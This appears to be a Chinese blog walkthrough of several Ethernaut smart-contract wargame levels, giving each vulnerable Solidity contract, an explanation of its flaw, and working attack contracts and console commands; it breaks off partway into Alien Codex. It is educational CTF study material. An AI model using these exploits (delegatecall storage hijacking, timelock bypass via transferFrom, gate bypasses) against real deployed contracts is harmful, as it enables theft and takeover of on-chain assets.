<h2 id="Gatekeeper-One"><a href="#Gatekeeper-One" class="headerlink" title="Gatekeeper One"></a>Gatekeeper One</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract GatekeeperOne &#123;</span><br><span class="line"></span><br><span class="line">  address public entrant;</span><br><span class="line"></span><br><span class="line">  modifier gateOne() &#123;</span><br><span class="line">    require(msg.sender !&#x3D; tx.origin);</span><br><span class="line">    _;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  modifier gateTwo() &#123;</span><br><span class="line">    require(gasleft() % 8191 &#x3D;&#x3D; 0);</span><br><span class="line">    _;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  modifier gateThree(bytes8 _gateKey) &#123;</span><br><span class="line">      require(uint32(uint64(_gateKey)) &#x3D;&#x3D; uint16(uint64(_gateKey)), &quot;GatekeeperOne: invalid gateThree part one&quot;);</span><br><span class="line">      require(uint32(uint64(_gateKey)) !&#x3D; uint64(_gateKey), &quot;GatekeeperOne: invalid gateThree part two&quot;);</span><br><span class="line">      require(uint32(uint64(_gateKey)) &#x3D;&#x3D; uint16(uint160(tx.origin)), &quot;GatekeeperOne: invalid gateThree part three&quot;);</span><br><span class="line">    _;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) &#123;</span><br><span class="line">    entrant &#x3D; tx.origin;</span><br><span class="line">    return true;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>通关条件</strong>：正常执行完<code>enter</code>函数。</p>
<p>我们先来看看，如何绕过三个<code>gate</code>函数，第一个可以参照<code>Telephone</code>关卡，借助第三方合约即可。</p>
<p>对于第二个函数，<code>gasleft()</code>返回的是当前可用的<code>gas</code>，这个要你知道该合约运行到这一行时候，所消耗的<code>gas</code>，需要我们直到题目使用的编译器，然后放到本地调试，这种方法太麻烦了，所以我选择枚举，即调用时候设置gas为<code>n*8191+x</code>，不断改变x，再调用即可。</p>
<p>对于第三个函数，假设<code>_gatekey</code>可以被下面数字表示：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0xab cd ef gh ij kl mn op</span><br></pre></td></tr></table></figure>

<p>对于第一个条件，要求<code>ijklmnop==0000mnop</code>,即<code>ijkl=0000</code>，</p>
<p>对于第二个条件，要求<code>00000000ijklmnop!=abcdefghijklmnop</code>，即<code>00000000!=abcdefgh</code></p>
<p>第三个条件，要求<code>ijklmnop==0000xxxx</code>，其中，<code>xxxx</code>是<code>tx.origin</code>的低两个字节。</p>
<p>故，满足条件的一个<code>_gateKey</code>为<code>1111111100001df4</code>（我的metamask账户的最低两字节是<code>1df4</code>）</p>
<p>综上，我们可以借助下面的攻击合约：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract GatekeeperOneAttack &#123;</span><br><span class="line">    function attack() public &#123;</span><br><span class="line">        &#x2F;&#x2F; 	该地址可以在控制台中输入 &#96;instance&#96; 获取</span><br><span class="line">        address _addr &#x3D; 0x8F29B1467240Ccd340BD33371559cC76729b8e27;</span><br><span class="line">        bytes8 _gateKey &#x3D; 0x1111111100001df4;</span><br><span class="line">        for(uint x &#x3D; 0; x &lt; 8191; x +&#x3D; 1)&#123;</span><br><span class="line">            (bool success, bytes memory data) &#x3D; _addr.call&#123;gas: 81910 + x&#125;(</span><br><span class="line">                abi.encodeWithSignature(&quot;enter(bytes8)&quot;, _gateKey)</span><br><span class="line">            );</span><br><span class="line">            if(success)&#123;</span><br><span class="line">                break;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="Gatekeeper-Two"><a href="#Gatekeeper-Two" class="headerlink" title="Gatekeeper Two"></a>Gatekeeper Two</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract GatekeeperTwo &#123;</span><br><span class="line"></span><br><span class="line">  address public entrant;</span><br><span class="line"></span><br><span class="line">  modifier gateOne() &#123;</span><br><span class="line">    require(msg.sender !&#x3D; tx.origin);</span><br><span class="line">    _;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  modifier gateTwo() &#123;</span><br><span class="line">    uint x;</span><br><span class="line">    assembly &#123; x :&#x3D; extcodesize(caller()) &#125;</span><br><span class="line">    require(x &#x3D;&#x3D; 0);</span><br><span class="line">    _;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  modifier gateThree(bytes8 _gateKey) &#123;</span><br><span class="line">    require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) &#x3D;&#x3D; type(uint64).max);</span><br><span class="line">    _;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) &#123;</span><br><span class="line">    entrant &#x3D; tx.origin;</span><br><span class="line">    return true;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>通关条件</strong>：正常执行完<code>enter</code>函数。</p>
<p>关于第一个条件，参照关卡【Gatekeeper One】即可。</p>
<p>但是第二个条件又要要求调用者的地址上不能没有代码，即貌似调用者必须是一个外部账户（EOA）？其实不然，如果一个合约，在构造函数运行阶段，对该地址调用<code>extcodesize</code>，则返回的是零，我们利用这一点即可。</p>
<p>对于第三个，先是对我们的调用方的地址进行打包，又进行计算哈希，又是转数组，又是转64位无符号整数的，最后还要和一个数字异或，看似很复杂，其实，我们可用使用异或的逆操作，即：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">x ^ y &#x3D; z</span><br><span class="line">则 x &#x3D; y ^ z</span><br></pre></td></tr></table></figure>

<p>最终，攻击的合约如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract GatekeeperTwoAttack &#123;</span><br><span class="line">     constructor()  &#123;</span><br><span class="line">        &#x2F;&#x2F; 	该地址可以在控制台中输入 &#96;instance&#96; 获取</span><br><span class="line">        address _addr &#x3D; 0x0aD80881e0C2b8294beA62b5916Bb0029b93922e;</span><br><span class="line">        bytes8 _gateKey &#x3D; bytes8(type(uint64).max ^ uint64(bytes8(keccak256(abi.encodePacked(this)))));</span><br><span class="line">    	_addr.call(</span><br><span class="line">                abi.encodeWithSignature(&quot;enter(bytes8)&quot;, _gateKey)</span><br><span class="line">            );</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="Naught-Coin"><a href="#Naught-Coin" class="headerlink" title="Naught Coin"></a>Naught Coin</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">import &#39;openzeppelin-contracts-08&#x2F;token&#x2F;ERC20&#x2F;ERC20.sol&#39;;</span><br><span class="line"></span><br><span class="line"> contract NaughtCoin is ERC20 &#123;</span><br><span class="line"></span><br><span class="line">  &#x2F;&#x2F; string public constant name &#x3D; &#39;NaughtCoin&#39;;</span><br><span class="line">  &#x2F;&#x2F; string public constant symbol &#x3D; &#39;0x0&#39;;</span><br><span class="line">  &#x2F;&#x2F; uint public constant decimals &#x3D; 18;</span><br><span class="line">  uint public timeLock &#x3D; block.timestamp + 10 * 365 days;</span><br><span class="line">  uint256 public INITIAL_SUPPLY;</span><br><span class="line">  address public player;</span><br><span class="line"></span><br><span class="line">  constructor(address _player) </span><br><span class="line">  ERC20(&#39;NaughtCoin&#39;, &#39;0x0&#39;) &#123;</span><br><span class="line">    player &#x3D; _player;</span><br><span class="line">    INITIAL_SUPPLY &#x3D; 1000000 * (10**uint256(decimals()));</span><br><span class="line">    &#x2F;&#x2F; _totalSupply &#x3D; INITIAL_SUPPLY;</span><br><span class="line">    &#x2F;&#x2F; _balances[player] &#x3D; INITIAL_SUPPLY;</span><br><span class="line">    _mint(player, INITIAL_SUPPLY);</span><br><span class="line">    emit Transfer(address(0), player, INITIAL_SUPPLY);</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  function transfer(address _to, uint256 _value) override public lockTokens returns(bool) &#123;</span><br><span class="line">    super.transfer(_to, _value);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  &#x2F;&#x2F; Prevent the initial owner from transferring tokens until the timelock has passed</span><br><span class="line">  modifier lockTokens() &#123;</span><br><span class="line">    if (msg.sender &#x3D;&#x3D; player) &#123;</span><br><span class="line">      require(block.timestamp &gt; timeLock);</span><br><span class="line">      _;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">     _;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>通关条件</strong>：将您的代币余额变成零。</p>
<p>乍一看上去，由于十年期限的限制，我们无法使用<code>transfer</code>进行转账，但是实际上该代币是<code>ERC20</code>代币的实现，该代币接口中有一个授权转账的函数：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function transferFrom(address from, address to, uint256 amount) public virtual override returns (bool) &#123;</span><br><span class="line">        address spender &#x3D; _msgSender();</span><br><span class="line">        _spendAllowance(from, spender, amount);</span><br><span class="line">        _transfer(from, to, amount);</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function _spendAllowance(address owner, address spender, uint256 amount) internal virtual &#123;</span><br><span class="line">        uint256 currentAllowance &#x3D; allowance(owner, spender);</span><br><span class="line">        if (currentAllowance !&#x3D; type(uint256).max) &#123;</span><br><span class="line">            require(currentAllowance &gt;&#x3D; amount, &quot;ERC20: insufficient allowance&quot;);</span><br><span class="line">            unchecked &#123;</span><br><span class="line">                _approve(owner, spender, currentAllowance - amount);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>但是使用该函数有个前提条件，即<code>msg.sender</code>要获得<code>from</code>的授权，授权代币额度大于等于<code>amount</code>。</p>
<p>因此我们要给自己授权，该函数实现如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function approve(address spender, uint256 amount) public virtual override returns (bool) &#123;</span><br><span class="line">        address owner &#x3D; _msgSender();</span><br><span class="line">        _approve(owner, spender, amount);</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p><code>spender</code>是被授权方。</p>
<p>因此依次在控制台输入如下即可：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">await</span> contract.approve(player,<span class="string">'1000000000000000000000000'</span>)</span><br><span class="line"><span class="keyword">await</span> contract.transferFrom(player,<span class="string">'0x34a2Bdc713002B5b7c80F20233b306977aD3B64E'</span>,<span class="string">'1000000000000000000000000'</span>)</span><br></pre></td></tr></table></figure>

<p><code>0x34a2Bdc713002B5b7c80F20233b306977aD3B64E</code>是一个合法的第三方账户。</p>
<h2 id="Preservation"><a href="#Preservation" class="headerlink" title="Preservation"></a>Preservation</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract Preservation &#123;</span><br><span class="line"></span><br><span class="line">  &#x2F;&#x2F; public library contracts </span><br><span class="line">  address public timeZone1Library;</span><br><span class="line">  address public timeZone2Library;</span><br><span class="line">  address public owner; </span><br><span class="line">  uint storedTime;</span><br><span class="line">  &#x2F;&#x2F; Sets the function signature for delegatecall</span><br><span class="line">  bytes4 constant setTimeSignature &#x3D; bytes4(keccak256(&quot;setTime(uint256)&quot;));</span><br><span class="line"></span><br><span class="line">  constructor(address _timeZone1LibraryAddress, address _timeZone2LibraryAddress) &#123;</span><br><span class="line">    timeZone1Library &#x3D; _timeZone1LibraryAddress; </span><br><span class="line">    timeZone2Library &#x3D; _timeZone2LibraryAddress; </span><br><span class="line">    owner &#x3D; msg.sender;</span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line">  &#x2F;&#x2F; set the time for timezone 1</span><br><span class="line">  function setFirstTime(uint _timeStamp) public &#123;</span><br><span class="line">    timeZone1Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  &#x2F;&#x2F; set the time for timezone 2</span><br><span class="line">  function setSecondTime(uint _timeStamp) public &#123;</span><br><span class="line">    timeZone2Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; Simple library contract to set the time</span><br><span class="line">contract LibraryContract &#123;</span><br><span class="line"></span><br><span class="line">  &#x2F;&#x2F; stores a timestamp </span><br><span class="line">  uint storedTime;  </span><br><span class="line"></span><br><span class="line">  function setTime(uint _time) public &#123;</span><br><span class="line">    storedTime &#x3D; _time;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>通关条件</strong>：获得合约所有权。</p>
<p>我们先来回顾一下<code>delegatecall</code>的用法</p>
<p><img src="https://cdn.yalexin.top/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20230218130226.png" alt></p>
<p>实际上，你可以粗略地理解成我们把目标合约的函数代码给拿了过来，放在我们当前合约中执行，修改的是当前合约的变量，相当于引入库函数的功能。</p>
<p>我们先来看一下<code>Preservation</code>合约的存储：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">---------------------------------------</span><br><span class="line">|  unused (12) | timeZone1Library (20)| &lt;- slot 0</span><br><span class="line">---------------------------------------</span><br><span class="line">|  unused (12) | timeZone2Library (20)| &lt;- slot 1</span><br><span class="line">---------------------------------------</span><br><span class="line">|  unused (12) |       owner (20)     | &lt;- slot 2</span><br><span class="line">---------------------------------------</span><br><span class="line">|            storedTime (32)          | &lt;- slot 3</span><br><span class="line">---------------------------------------</span><br><span class="line">|    unused (28) |setTimeSignature (4)| &lt;- slot 4</span><br><span class="line">---------------------------------------</span><br></pre></td></tr></table></figure>

<p>再来看看<code>LibraryContract</code>合约的存储：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">---------------------------------------</span><br><span class="line">|            storedTime (32)          | &lt;- slot 0</span><br><span class="line">---------------------------------------</span><br></pre></td></tr></table></figure>

<p>由于变量<code>storedTime</code>在<code>LibraryContract</code>合约中，是在<code>slot 0</code>的位置，因此当<code>Preservation</code>调用<code>setFirstTime</code>的时候，由于<code>delegatecall</code>的特性，修改的是其<code>slot 0</code>处的变量，即变量<code>timeZone1Library</code>，也就是说，我们可将其设置为一个恶意地址，指向一个恶意合约，然后恶意中修改<code>owner</code>变量即可。</p>
<p>攻击合约如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract PreservationAttack &#123;</span><br><span class="line"></span><br><span class="line">  address public foo1;</span><br><span class="line">  address public foo2;</span><br><span class="line">  address public storedTime; </span><br><span class="line"></span><br><span class="line"> function setTime(uint _time) public &#123;</span><br><span class="line"> &#x2F;&#x2F; storedTime 是在 slot 2 的位置，因此将来修改的是 owner</span><br><span class="line">    storedTime &#x3D; address(uint160(_time));</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们先部署上述合约，获得其地址<code>0x5F100674E2b7b3Ff0C3E93582151fA16E75e96eD</code>，然后在控制台输入：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">await</span> contract.setFirstTime(<span class="string">'0x5F100674E2b7b3Ff0C3E93582151fA16E75e96eD'</span>)</span><br></pre></td></tr></table></figure>

<p>再调用函数</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">await</span> contract.setFirstTime(player)</span><br></pre></td></tr></table></figure>

<p>即可完成修改。</p>
<h2 id="Recovery"><a href="#Recovery" class="headerlink" title="Recovery"></a>Recovery</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract Recovery &#123;</span><br><span class="line"></span><br><span class="line">  &#x2F;&#x2F;generate tokens</span><br><span class="line">  function generateToken(string memory _name, uint256 _initialSupply) public &#123;</span><br><span class="line">    new SimpleToken(_name, msg.sender, _initialSupply);</span><br><span class="line">  </span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract SimpleToken &#123;</span><br><span class="line"></span><br><span class="line">  string public name;</span><br><span class="line">  mapping (address &#x3D;&gt; uint) public balances;</span><br><span class="line"></span><br><span class="line">  &#x2F;&#x2F; constructor</span><br><span class="line">  constructor(string memory _name, address _creator, uint256 _initialSupply) &#123;</span><br><span class="line">    name &#x3D; _name;</span><br><span class="line">    balances[_creator] &#x3D; _initialSupply;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  &#x2F;&#x2F; collect ether in return for tokens</span><br><span class="line">  receive() external payable &#123;</span><br><span class="line">    balances[msg.sender] &#x3D; msg.value * 10;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  &#x2F;&#x2F; allow transfers of tokens</span><br><span class="line">  function transfer(address _to, uint _amount) public &#123; </span><br><span class="line">    require(balances[msg.sender] &gt;&#x3D; _amount);</span><br><span class="line">    balances[msg.sender] &#x3D; balances[msg.sender] - _amount;</span><br><span class="line">    balances[_to] &#x3D; _amount;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  &#x2F;&#x2F; clean up after ourselves</span><br><span class="line">  function destroy(address payable _to) public &#123;</span><br><span class="line">    selfdestruct(_to);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>通关条件</strong>：找回已部署的<code>SimpleToken</code>合约。</p>
<p> 该关卡考察的应该是如何根据合约地址去追踪历史交易。</p>
<p>我们先在控制台输入<code>instance</code>，获取关卡实例地址，注意，这不是合约<code>SimpleToken</code>的地址，得到该实力地址以后，打开浏览器，输入</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;sepolia.etherscan.io&#x2F;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>我用的是sepolia测试网，如果使用的是其他测试网，要相应地修改地址</p>
</blockquote>
<p>输入实力地址，并选择internal transaction，找到最新的记录</p>
<p><img src="https://cdn.yalexin.top/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20230304132643.png" alt></p>
<p>点击【Contract Creation】，进去后得到一个地址<code>0x502C2D61E236119acEe7E973cb7fB1cd180AcB8f</code>，而且该地址账户拥有0.001ether，实际上该地址就是我们要找的合约地址，我们只要调用该地址上面的<code>destroy</code>函数即可，我们可用通关部署一下合约进行：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract RecoveryAttack &#123;</span><br><span class="line">&#x2F;&#x2F; 在控制台输入  player 获得对应地址</span><br><span class="line">  constructor(address _player)&#123;</span><br><span class="line">  </span><br><span class="line">  	address(0x502C2D61E236119acEe7E973cb7fB1cd180AcB8f).call(</span><br><span class="line">  		abi.encodeWithSignature(&quot;destroy(address)&quot;, _player)</span><br><span class="line">  	);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="MagicNumber"><a href="#MagicNumber" class="headerlink" title="MagicNumber"></a>MagicNumber</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract MagicNum &#123;</span><br><span class="line"></span><br><span class="line">  address public solver;</span><br><span class="line"></span><br><span class="line">  constructor() &#123;&#125;</span><br><span class="line"></span><br><span class="line">  function setSolver(address _solver) public &#123;</span><br><span class="line">    solver &#x3D; _solver;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  &#x2F;*</span><br><span class="line">    ____________&#x2F;\\\_______&#x2F;\\\\\\\\\_____        </span><br><span class="line">     __________&#x2F;\\\\\_____&#x2F;\\\&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;\\\___       </span><br><span class="line">      ________&#x2F;\\\&#x2F;\\\____\&#x2F;&#x2F;&#x2F;______\&#x2F;&#x2F;\\\__      </span><br><span class="line">       ______&#x2F;\\\&#x2F;\&#x2F;\\\______________&#x2F;\\\&#x2F;___     </span><br><span class="line">        ____&#x2F;\\\&#x2F;__\&#x2F;\\\___________&#x2F;\\\&#x2F;&#x2F;_____    </span><br><span class="line">         __&#x2F;\\\\\\\\\\\\\\\\_____&#x2F;\\\&#x2F;&#x2F;________   </span><br><span class="line">          _\&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;\\\&#x2F;&#x2F;____&#x2F;\\\&#x2F;___________  </span><br><span class="line">           ___________\&#x2F;\\\_____&#x2F;\\\\\\\\\\\\\\\_ </span><br><span class="line">            ___________\&#x2F;&#x2F;&#x2F;_____\&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;__</span><br><span class="line">  *&#x2F;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>通关条件</strong>：部署一个合约</p>
<p>我们需要部署一个合约<code>Solver</code>，该合约中会返回一个数字，和<code>whatIsTheMeaningOfLife()</code>对应，实际上是42（<del>别问我怎么知道，问就是网友说的</del>）.还要要求该合约中的字节码不超过10个。</p>
<p>本关卡好难，直接去网上看别人的做法！</p>
<blockquote>
<p>参考链接<a href="https://paper.seebug.org/790/" target="_blank" rel="noopener">【以太坊智能合约静态分析】</a>、<a href="https://www.ethervm.io/" target="_blank" rel="noopener">【ethervm.io】</a>【<a href="https://xz.aliyun.com/t/11159#toc-9】" target="_blank" rel="noopener">https://xz.aliyun.com/t/11159#toc-9】</a></p>
</blockquote>
<p>智能合约编译后的字节码，分为三个部分：部署代码、runtime代码、auxdata。</p>
<p>当然，auxdata是源码的加密指纹，用来验证。这只是数据，永远不会被EVM执行。</p>
<p>以太坊虚拟机在创建合约的时候，会先创建一个合约账户，然后运行部署代码。运行完成后它会将<strong>runtime代码+auxdata 存储到区块链上</strong>。之后再把二者的存储地址跟合约账户关联起来(也就是把合约账户中的code hash字段用该地址赋值)，这样就完成了合约的部署。而我们本关卡主要是从runtime代码入手。</p>
<p>如果我们要返回42，则最后的字节码必须是<code>RETURN</code>，使用该字节码时候，将会依次从栈中取两个元素，作为偏移量<code>offset</code>和长度<code>length</code>，最终返回的内容是<code>memory[offset:offset+length]</code>，因此我们要在<code>RETURN</code>上面将偏移量和长度写进栈中，然后在此之上，再写入42到内存<code>memory</code>中。具体如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">偏移    汇编指令对应二进制（16进制）实际汇编指令</span><br><span class="line">0000    602a                 PUSH1 0x2a</span><br><span class="line">0002    6050                 PUSH1 0x50</span><br><span class="line">0004    52                   mstore</span><br><span class="line">0007    6020                 PUSH1 0x20</span><br><span class="line">0009    6050                 PUSH1 0x50</span><br><span class="line">000B    F3                   RETURN</span><br></pre></td></tr></table></figure>

<p>前三行是写入42，后三行是设置<code>return</code>的内容.设置偏移量为<code>0x50</code>是因为我们的低部分位置放了代码。</p>
<p>上述的汇编作为<code>runtime</code>代码，刚好10个字节，即10个<code>opcode</code>（以太坊中，一个字节码占用一个字节）。</p>
<p>下一步，我们要通过部署代码，将<code>runtime</code>代码写入区块链；在部署代码这一块，写入代码需要使用<code>CODECOPY</code>，该操作码会依次从栈中取出三个操作数<code>destOffset</code>、<code>offset</code>、<code>length</code>，即完成</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">memory[destOffset:destOffset+length] &#x3D; msg.data[offset:offset+length]</span><br></pre></td></tr></table></figure>

<p>因此这一段的汇编如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">偏移    汇编指令对应二进制（16进制）实际汇编指令</span><br><span class="line">0000    600a            PUSH1 0x0a</span><br><span class="line">0002    600c            PUSH1 0x0c</span><br><span class="line">0004    6000            PUSH1 0x00</span><br><span class="line">0006    39              CODECOPY</span><br><span class="line">0007    600a            PUSH1 0x0a</span><br><span class="line">0009    6000            PUSH1 0x00</span><br><span class="line">000B    F3              RETURN</span><br></pre></td></tr></table></figure>

<p>第一次<code>push</code>的是<code>0x0a</code>，这是runtime代码的长度，第二次<code>push</code>的是<code>0x0c</code>，是因为我们的部署代码的长度是12个字节，我们将<code>runtime</code>代码附在部署代码后面，则<code>runtime</code>代码的偏移量是<code>0x0c</code>，第三次<code>push</code>的是<code>0x00</code>，是因为我们打算将我们的<code>runtime</code>代码保存到内存<code>memory</code>的<code>slot 0</code>处。最后是将<code>memory</code>的空间扩展到<code>len=0x0a</code>(如果之前不足的话) 并返回部署后的字节码.最终的汇编如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">偏移    汇编指令对应二进制（16进制）实际汇编指令</span><br><span class="line">0000    600a            	PUSH1 0x0a</span><br><span class="line">0002    600c            	PUSH1 0x0c</span><br><span class="line">0004    6000            	PUSH1 0x00</span><br><span class="line">0006    39              	CODECOPY</span><br><span class="line">0007    600a            	PUSH1 0x0a</span><br><span class="line">0009    6000            	PUSH1 0x00</span><br><span class="line">000B    F3              	RETURN</span><br><span class="line">000C    602a                 PUSH1 0x2a</span><br><span class="line">000E    6050                 PUSH1 0x50</span><br><span class="line">0010    52                   mstore</span><br><span class="line">0011    6020                 PUSH1 0x20</span><br><span class="line">0013    6050                 PUSH1 0x50</span><br><span class="line">0015    F3                   RETURN</span><br></pre></td></tr></table></figure>

<p>即<code>600a600c600039600a6000F3602a60505260206050F3</code>是我们要部署的内容。</p>
<p>我们在控制台输入一下代码即可：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">byteCode = <span class="string">"600a600c600039600a6000F3602a60505260206050F3"</span></span><br><span class="line"><span class="keyword">await</span> web3.eth.sendTransaction(&#123;<span class="attr">from</span>: player, <span class="attr">data</span>: byteCode&#125;)</span><br><span class="line"><span class="comment">// 将会返回contract地址，假设为0x01</span></span><br><span class="line"><span class="keyword">await</span> contract.setSolver(<span class="string">'0x01'</span>)</span><br></pre></td></tr></table></figure>

<p>然后提交即可。</p>
<h2 id="Alien-Codex"><a href="#Alien-Codex" class="headerlink" title="Alien Codex"></a>Alien Codex</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.5.0;</span><br><span class="line"></span><br><span class="line">import &#39;..&#x2F;helpers&#x2F;Ownable-05.sol&#39;;</span><br><span class="line"></span><br><span class="line">contract AlienCodex is Ownable &#123;</span><br><span class="line"></span><br><span class="line">  bool public contact;</span><br><span class="line">  bytes32[] public codex;</span><br><span class="line"></span><br><span class="line">  modifier contacted() &#123;</span><br><span class="line">    assert(contact);</span><br><span class="line">    _;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  function make_contact() public &#123;</span><br><span class="line">    contact &#x3D; true;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function record(bytes32 _content) contacted public &#123;</span><br><span class="line">    codex.push(_content);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function retract() contacted public &#123;</span><br><span class="line">    codex.length--;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function revise(uint i, bytes32 _content) contacted public &#123;</span><br><span class="line">    codex[i] &#x3D; _content;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>通关条件</strong>：获得合约所有权。</p>
<p>乍一看上去，没有修改合约所有权的函数，实际上，该合约继承了<code>Ownable</code>合约，该合约可以<a href="https://github.com/OpenZeppelin/openzeppelin-test-helpers/blob/master/contracts/Ownable.sol" target="_blank" rel="noopener">【此】</a>查看，实际上，就算我们不查看该合约，我们也可以依次在控制台输入一下代码，查看相关存储布局：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">await</span> contract.owner()</span><br><span class="line"><span class="keyword">await</span> web3.eth.getStorageAt(instance, <span class="string">"0"</span>)</span><br><span class="line"><span class="keyword">await</span> contract.make_contact()</span><br><span class="line"><span class="keyword">await</span> web3.eth.getStorageAt(instance, <span class="string">"0"</span>)</span><br></pre></td></tr></table></figure>

